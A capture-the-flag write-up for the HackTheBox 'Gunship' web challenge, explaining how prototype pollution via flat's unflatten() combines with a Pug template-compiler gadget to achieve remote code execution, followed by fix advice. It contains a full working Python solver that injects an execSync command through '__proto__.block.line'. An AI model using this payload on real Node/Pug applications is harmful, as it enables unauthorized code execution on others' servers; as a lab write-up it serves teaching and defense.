## Overview

`Gunship` is a Very Easy HackTheBox **Web** challenge — a tribute page for the British synthwave band of the same name. The backend is a small Node/Express app that takes a JSON body, runs it through `flat`'s `unflatten()`, and renders a Pug template. Those two facts sitting next to each other are the whole bug: `unflatten` gives us a [prototype pollution](https://cwe.mitre.org/data/definitions/1321.html) ([CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)) primitive, and Pug's template compiler is the gadget that turns a polluted property into remote code execution.

## The technique

The vulnerable route looks like this:

```js
const { unflatten } = require('flat');           // flat 5.0.0

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

    if (artist.name.includes('Haigh') || artist.name.includes('Westaway')
        || artist.name.includes('Gingell')) {
        return res.json({
            response: pug.compile('span Hello #{user}, thank you...')({ user: 'guest' })
        });
    }
    return res.json({ response: 'Please provide the full name of an existing member.' });
});
```

`flat`'s `unflatten()` walks each key by splitting on `.` and assigning down the path, so the JSON key `"__proto__.block"` assigns to `({}).__proto__.block` — which is `Object.prototype.block`. After that, **every** plain object in the process inherits a `block` property. This is a distinct pollution vector from the more common recursive-merge (`lodash _.merge`) one — any `unflatten`/dotted-key sink is a pollution primitive.

The gadget is Pug. When `pug.compile()` runs with `compileDebug` enabled (the default), `pug-code-gen` emits, for each AST node, a debug-line marker straight into the **source string** of the function it constructs:

```js
pug_debug_line = <node.line>;
```

Normally `node.line` is an integer. But our polluted `block.line` is read as that node's line value — and if it's a string of JavaScript, it gets concatenated verbatim into the compiled function body and runs at compile time. The `artist.name` allowlist (real band members) only gates which branch executes, so we include one real member to reach `pug.compile`.

## Solution

The full, copy-pasteable solver. It pollutes `block.line` with an `execSync` payload, then reads the flag back out:

```python
#!/usr/bin/env python3
import sys, requests

BASE = sys.argv[1].rstrip("/")
CMD = "cat /app/flag* > /app/static/flag.txt"     # flag filename is randomized -> glob it

payload = {
    "artist.name": "Gingell",                      # passes the member allowlist
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require(`child_process`).execSync(`%s`)" % CMD,
    },
}

requests.post(BASE + "/api/submit", json=payload, timeout=20)    # RCE fires at compile time
print(requests.get(BASE + "/static/flag.txt", timeout=20).text)  # served from the static mount
```

Run it against the instance:

```bash
python3 solve.py http://<target>:<port>
# HTB{...}
```

Two practical details make this reliable:

- **Randomized flag name** — the container's entrypoint does `mv /app/flag /app/flag$RANDOM5`, so read it with a glob: `cat /app/flag*`.
- **Filtered egress** — challenge containers usually can't reach back out, so don't `nc`/`curl` out. The app serves `/app/static` at `/static`, so the payload writes the flag *there* and we simply `GET /static/flag.txt`.

## Why it worked

Prototype-pollution RCE is always a two-part chain: a pollution *primitive* (a merge or unflatten of untrusted JSON that reaches `Object.prototype`) plus a downstream *gadget* (code that later reads an option/property off a fresh plain object). Here the primitive is `flat.unflatten(req.body)` and the gadget is Pug's `compileDebug` writing `node.line` into generated source. Neither is RCE on its own — the composition is.

## Fix / defense

- Upgrade `flat` to **≥5.0.1**, which strips `__proto__`/`constructor`/`prototype` keys during unflatten.
- Don't `unflatten`/merge raw request bodies — validate against a strict schema (`ajv`/`Joi`, `additionalProperties:false`) first.
- `Object.freeze(Object.prototype)` at boot so pollution simply fails.
- Compile templates with a fixed options object and `compileDebug:false`; never let request data influence compiler options.
